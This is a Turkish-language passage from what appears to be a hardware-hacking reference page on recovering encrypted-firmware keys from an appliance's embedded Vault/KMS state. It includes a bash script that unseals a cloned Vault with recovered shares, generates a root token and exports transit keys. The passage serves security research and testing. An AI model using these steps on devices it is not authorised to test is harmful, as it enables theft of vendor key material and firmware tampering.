- Azeria Labs VM 2.0
- [https://azeria-labs.com/lab-vm-2-0/](https://azeria-labs.com/lab-vm-2-0/)
- Damn Vulnerable IoT Device (DVID)
- [https://github.com/Vulcainreo/DVID](https://github.com/Vulcainreo/DVID)

## Embedded KMS/Vault state'ten firmware decryption key'lerini kurtarma

Bir update image'ı küçük plaintext metadata ile büyük bir high-entropy blob'u birlikte içerdiğinde herhangi bir brute-force işleminden önce container triage yapın:<sup>[[1]](#references)</sup>

- `hexdump`, `xxd`, `strings -tx`, `base64 -d` ve `binwalk -E` ile header'ları, offset'leri ve line boundary'lerini dump edin.
- `Salted__` genellikle OpenSSL `enc` formatını ifade eder: sonraki 8 byte salt'tır ve kalan byte'lar ciphertext'tir.
- Tam olarak `256` byte'a decode olan bir Base64 field, büyük olasılıkla random firmware password/session key'i saran bir RSA-2048 ciphertext'e işaret eder.
- Aynı file içindeki detached PGP material genellikle yalnızca authenticity'yi korur; bunun confidentiality mechanism olduğunu varsaymayın.

Static key hunting (`grep`, `strings`, PEM/PGP searches) başarısız olursa yalnızca private key'leri aramak yerine **operational decrypt path**'i reverse edin:

- Updater / management binary'sini decompile edin ve encrypted blob'u kimin okuduğunu, hangi helper/API'nin onu unwrap ettiğini ve istenen logical key name'i trace edin.
- Extract edilen root filesystem içinde KMS state (`vault/`, `transit/`, `pkcs11`, `keystore`, `sealed-secrets`) ile unit file'larını ve init script'lerini arayın.
- Plaintext `vault operator unseal ...`, recovery key'leri, bootstrap token'larını veya local KMS auto-unseal script'lerini private-key material ile eşdeğer kabul edin.

Appliance original Vault binary'sini ve storage backend'ini içeriyorsa bu environment'ı replay etmek genellikle Vault internals'ını yeniden implement etmekten daha kolaydır:
```bash
vault server -config=/tmp/vault.hcl
vault operator unseal <share1>
vault operator unseal <share2>
vault operator unseal <share3>

OTP=$(vault operator generate-root -generate-otp)
INIT=$(vault operator generate-root -init -otp="$OTP" 2>&1 | sed 's/\x1b\[[0-9;]*m//g')
NONCE=$(printf '%s\n' "$INIT" | awk '/Nonce/ {print $2}')
vault operator generate-root -nonce="$NONCE" "<share1>"
vault operator generate-root -nonce="$NONCE" "<share2>"
FINAL=$(vault operator generate-root -nonce="$NONCE" "<share3>" 2>&1 | sed 's/\x1b\[[0-9;]*m//g')
TOKEN=$(vault operator generate-root -decode="$(printf '%s\n' "$FINAL" | awk '/Root Token/ {print $3}')" -otp="$OTP")
```
Cloned KMS üzerinde root yetkisiyle:

- Transit anahtarlarını yalnızca izole clone içinde export edilebilir hâle getirin: `vault write transit/keys/<name>/config exportable=true`
- Unwrap anahtarını export edin: `vault read transit/export/encryption-key/<name>`
- Kurtarılan RSA anahtarını KMS tarafından kullanılan tam padding/hash çiftiyle deneyin. Başarısız bir PKCS#1 v1.5 decrypt ve başarısız bir varsayılan OAEP decrypt işlemi, anahtarın yanlış olduğunu **kanıtlamaz**; Vault-backed akışların çoğu SHA-256 ile OAEP kullanırken yaygın kütüphaneler varsayılan olarak SHA-1 kullanır.
- Payload `Salted__` ile başlıyorsa AES-CBC decrypt işlemini denemeden önce vendor'ın OpenSSL KDF'sini (`EVP_BytesToKey`, legacy appliance'larda çoğunlukla MD5) tam olarak yeniden üretin.

Bu, "encrypted firmware" konusunu daha genel bir probleme dönüştürür: **appliance-side operational keys'i kurtarın, ardından tam unwrap + KDF parametrelerini offline olarak yeniden üretin**.

## Eğitim ve Sertifikalar

- [https://www.attify-store.com/products/offensive-iot-exploitation](https://www.attify-store.com/products/offensive-iot-exploitation)

## References

- [1] [Claude ile Firmware Cracking: Senior-Level Skill, Junior-Level Autonomy](https://bishopfox.com/blog/cracking-firmware-with-claude-senior-level-skill-junior-level-autonomy)
- [2] [Firmware Security Testing Methodology](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [3] [Practical IoT Hacking: The Definitive Guide to Attacking the Internet of Things](https://www.amazon.co.uk/Practical-IoT-Hacking-F-Chantzis/dp/1718500904)
- [4] [Terk edilmiş donanımlarda zero day'leri Exploit Etmek – Trail of Bits blogu](https://blog.trailofbits.com/2025/07/25/exploiting-zero-days-in-abandoned-hardware/)
- [5] [$20'lık Bir Smart Device Bana Evinize Erişim Sağladı](https://bishopfox.com/blog/how-a-20-smart-device-gave-me-access-to-your-home)
- [6] [Şimdi Görüyorsunuz: Şimdi Pwned'siniz](https://labs.taszk.io/articles/post/nowyouseemi/)
- [7] [Synacktiv - Tesla Wall Connector'ı şarj portu konektöründen Exploit Etmek - Bölüm 2: anti-downgrade'i bypass etmek](https://www.synacktiv.com/en/publications/exploiting-the-tesla-wall-connector-from-its-charge-port-connector-part-2-bypassing)
- [8] [Make it Blink: Philips Hue Bridge'in Over-the-Air Exploitation'ı](https://www.synacktiv.com/en/publications/make-it-blink-over-the-air-exploitation-of-the-philips-hue-bridge.html)
{{#include ../../banners/hacktricks-training.md}}
